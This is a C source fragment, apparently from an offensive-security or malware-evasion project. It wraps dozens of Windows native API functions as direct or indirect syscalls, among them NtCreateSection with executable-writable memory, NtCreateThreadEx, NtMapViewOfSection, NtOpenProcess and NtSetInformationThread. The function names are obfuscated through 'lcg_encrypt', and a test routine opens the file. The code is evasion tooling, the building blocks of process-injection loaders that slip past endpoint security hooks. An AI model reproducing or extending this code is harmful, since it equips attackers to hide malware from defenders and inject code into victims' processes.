    status = syscallNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    debugPrint("[+] NtCreateSection result: 0x%08X", status);

    if (NT_SUCCESS(status) && sectionHandle) {
        debugPrint("[+] Successfully created section handle: %p", sectionHandle);
        // Close the section handle since we're just testing
        if (funcTable && funcTable->NtClose) {
            funcTable->NtClose(sectionHandle);
            sectionHandle = NULL;
        }
        SUCCESS = true;
    } else {
        return false;
    }

    pNtCreateSection ptr = (pNtCreateSection)&syscallNtCreateSection;

    ptr(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    debugPrint("[+] NtCreateSection raw pointer result: 0x%08X", status);

    if (NT_SUCCESS(status) && sectionHandle) {
        debugPrint("[+] Successfully created section handle: %p", sectionHandle);
        // Close the section handle since we're just testing
        if (funcTable && funcTable->NtClose) {
            funcTable->NtClose(sectionHandle);
            sectionHandle = NULL;
        }
        SUCCESS = true;
    } else {
        return false;
    }

    debugPrint("[+] Syscall testing completed!");
    return SUCCESS;
}

#endif

NTSTATUS syscallNtClose(HANDLE Handle) {
    pNtClose pNtClose_func = (pNtClose)PrepareSyscall(lcg_encrypt("NtClose"));
    return pNtClose_func(Handle);
}

NTSTATUS syscallNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength) {
    pNtCreateFile pNtCreateFile_func = (pNtCreateFile)PrepareSyscall(lcg_encrypt("NtCreateFile"));
    return pNtCreateFile_func(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
}

NTSTATUS syscallNtDeleteFile(PCOBJECT_ATTRIBUTES ObjectAttributes) {
    pNtDeleteFile NtDeleteFile_func = (pNtDeleteFile)PrepareSyscall(lcg_encrypt("NtDeleteFile"));
    return NtDeleteFile_func(ObjectAttributes);
}

NTSTATUS syscallNtCreateUserProcess(PHANDLE ProcessHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess, ACCESS_MASK ThreadDesiredAccess, PCOBJECT_ATTRIBUTES ProcessObjectAttributes, PCOBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags, PRTL_USER_PROCESS_PARAMETERS ProcessParameters, PPS_CREATE_INFO CreateInfo, PPS_ATTRIBUTE_LIST AttributeList) {
    pNtCreateUserProcess pNtCreateUserProcess_func = (pNtCreateUserProcess)PrepareSyscall(lcg_encrypt("NtCreateUserProcess"));
    return pNtCreateUserProcess_func(ProcessHandle, ThreadHandle, ProcessDesiredAccess, ThreadDesiredAccess, ProcessObjectAttributes, ThreadObjectAttributes, ProcessFlags, ThreadFlags, ProcessParameters, CreateInfo, AttributeList);
}

NTSTATUS syscallNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList) {
    pNtCreateThreadEx pNtCreateThreadEx_func = (pNtCreateThreadEx)PrepareSyscall(lcg_encrypt("NtCreateThreadEx"));
    return pNtCreateThreadEx_func(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

NTSTATUS syscallNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
    pNtQueryDirectoryFile pNtQueryDirectoryFile_func = (pNtQueryDirectoryFile)PrepareSyscall(lcg_encrypt("NtQueryDirectoryFile"));
    return pNtQueryDirectoryFile_func(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
}

NTSTATUS syscallNtQueryVolumeInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FsInformation, ULONG Length, FSINFOCLASS FsInformationClass) {
    pNtQueryVolumeInformationFile pNtQueryVolumeInformationFile_func = (pNtQueryVolumeInformationFile)PrepareSyscall(lcg_encrypt("NtQueryVolumeInformationFile"));
    return pNtQueryVolumeInformationFile_func(FileHandle, IoStatusBlock, FsInformation, Length, FsInformationClass);
}

NTSTATUS syscallNtQueryInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass) {
    pNtQueryInformationFile pNtQueryInformationFile_func = (pNtQueryInformationFile)PrepareSyscall(lcg_encrypt("NtQueryInformationFile"));
    return pNtQueryInformationFile_func(FileHandle, IoStatusBlock, FileInformation, Length, FileInformationClass);
}

NTSTATUS syscallNtReadFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
    pNtReadFile pNtReadFile_func = (pNtReadFile)PrepareSyscall(lcg_encrypt("NtReadFile"));
    return pNtReadFile_func(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);
}

NTSTATUS syscallNtSetInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass) {
    pNtSetInformationFile pNtSetInformationFile_func = (pNtSetInformationFile)PrepareSyscall(lcg_encrypt("NtSetInformationFile"));
    return pNtSetInformationFile_func(FileHandle, IoStatusBlock, FileInformation, Length, FileInformationClass);
}

NTSTATUS syscallNtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions) {
    pNtOpenFile pNtOpenFile_func = (pNtOpenFile)PrepareSyscall(lcg_encrypt("NtOpenFile"));
    return pNtOpenFile_func(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
}

NTSTATUS syscallNtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus) {
    pNtTerminateProcess pNtTerminateProcess_func = (pNtTerminateProcess)PrepareSyscall(
        lcg_encrypt(
            "NtTerminateProcess"
        )
    );
    return pNtTerminateProcess_func(ProcessHandle, ExitStatus);
}

NTSTATUS syscallNtTerminateThread(HANDLE ThreadHandle, NTSTATUS ExitStatus) {
    pNtTerminateThread pNtTerminateThread_func = (pNtTerminateThread)PrepareSyscall(
        lcg_encrypt("NtTerminateThread")
    );
    return pNtTerminateThread_func(ThreadHandle, ExitStatus);
}

NTSTATUS syscallNtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout) {
    pNtWaitForSingleObject pNtWaitForSingleObject_func = (pNtWaitForSingleObject)PrepareSyscall(lcg_encrypt("NtWaitForSingleObject"));
    return pNtWaitForSingleObject_func(Handle, Alertable, Timeout);
}

NTSTATUS syscallNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    pNtAllocateVirtualMemory pNtAllocateVirtualMemory_func = (pNtAllocateVirtualMemory)PrepareSyscall(lcg_encrypt("NtAllocateVirtualMemory"));
    return pNtAllocateVirtualMemory_func(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

NTSTATUS syscallNtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType) {
    pNtFreeVirtualMemory pNtFreeVirtualMemory_func = (pNtFreeVirtualMemory)PrepareSyscall(lcg_encrypt("NtFreeVirtualMemory"));
    return pNtFreeVirtualMemory_func(ProcessHandle, BaseAddress, RegionSize, FreeType);
}

NTSTATUS syscallNtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle) {
    pNtCreateSection pNtCreateSection_func = (pNtCreateSection)PrepareSyscall(lcg_encrypt("NtCreateSection"));
    return pNtCreateSection_func(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
}

NTSTATUS syscallNtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
    pNtUnmapViewOfSection pNtUnmapViewOfSection_func = (pNtUnmapViewOfSection)PrepareSyscall(lcg_encrypt("NtUnmapViewOfSection"));
    return pNtUnmapViewOfSection_func(ProcessHandle, BaseAddress);
}

NTSTATUS syscallNtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect) {
    pNtMapViewOfSection pNtMapViewOfSection_func = (pNtMapViewOfSection)PrepareSyscall(lcg_encrypt("NtMapViewOfSection"));
    return pNtMapViewOfSection_func(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
}

NTSTATUS syscallNtOpenDirectoryObject(PHANDLE DirectoryHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    pNtOpenDirectoryObject pNtOpenDirectoryObject_func = (pNtOpenDirectoryObject)PrepareSyscall(lcg_encrypt("NtOpenDirectoryObject"));
    return pNtOpenDirectoryObject_func(DirectoryHandle, DesiredAccess, ObjectAttributes);
}

NTSTATUS syscallNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) {
    pNtQueryInformationProcess pNtQueryInformationProcess_func = (pNtQueryInformationProcess)PrepareSyscall(lcg_encrypt("NtQueryInformationProcess"));
    return pNtQueryInformationProcess_func(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);
}

NTSTATUS syscallNtWriteFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
    pNtWriteFile pNtWriteFile_func = (pNtWriteFile)PrepareSyscall(lcg_encrypt("NtWriteFile"));
    return pNtWriteFile_func(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);
}

NTSTATUS syscallNtCreateProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PCOBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, BOOLEAN InheritObjectTable, HANDLE SectionHandle, HANDLE DebugPort, HANDLE TokenHandle) {
    pNtCreateProcess pNtCreateProcess_func = (pNtCreateProcess)PrepareSyscall(lcg_encrypt("NtCreateProcess"));
    return pNtCreateProcess_func(ProcessHandle, DesiredAccess, ObjectAttributes, ParentProcess, InheritObjectTable, SectionHandle, DebugPort, TokenHandle);
}

NTSTATUS syscallNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
    pNtOpenProcess pNtOpenProcess_func = (pNtOpenProcess)PrepareSyscall(lcg_encrypt("NtOpenProcess"));
    return pNtOpenProcess_func(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

NTSTATUS syscallNtDeviceIoControlFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength) {
    pNtDeviceIoControlFile pNtDeviceIoControlFile_func = (pNtDeviceIoControlFile)PrepareSyscall(lcg_encrypt("NtDeviceIoControlFile"));
    return pNtDeviceIoControlFile_func(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength);
}

NTSTATUS syscallNtInitiatePowerAction(POWER_ACTION SystemAction, SYSTEM_POWER_STATE LightestSystemState, ULONG Flags, BOOLEAN Asynchronous) {
    pNtInitiatePowerAction pNtInitiatePowerAction_func = (pNtInitiatePowerAction)PrepareSyscall(lcg_encrypt("NtInitiatePowerAction"));
    return pNtInitiatePowerAction_func(SystemAction, LightestSystemState, Flags, Asynchronous);
}

NTSTATUS syscallNtQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    pNtQuerySystemInformation pNtQuerySystemInformation_func = (pNtQuerySystemInformation)PrepareSyscall(lcg_encrypt("NtQuerySystemInformation"));
    return pNtQuerySystemInformation_func(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
}

NTSTATUS syscallNtFlushInstructionCache(HANDLE ProcessHandle, PVOID BaseAddress, SIZE_T RegionSize){
    pNtFlushInstructionCache pNtFlushInstructionCache_func = (pNtFlushInstructionCache)PrepareSyscall(lcg_encrypt("NtFlushInstructionCache"));
    return pNtFlushInstructionCache_func(ProcessHandle, BaseAddress, RegionSize);
}


NTSTATUS syscallNtSetInformationThread(HANDLE ThreadHandle,
    _In_ THREADINFOCLASS ThreadInformationClass,
    _In_ PVOID ThreadInformation,
    _In_ ULONG ThreadInformationLength){
    pNtSetInformationThread NtSetInformationThread = (pNtSetInformationThread)PrepareSyscall(lcg_encrypt("NtSetInformationThread"));
    return NtSetInformationThread(ThreadHandle, ThreadInformationClass, ThreadInformation, ThreadInformationLength);
}
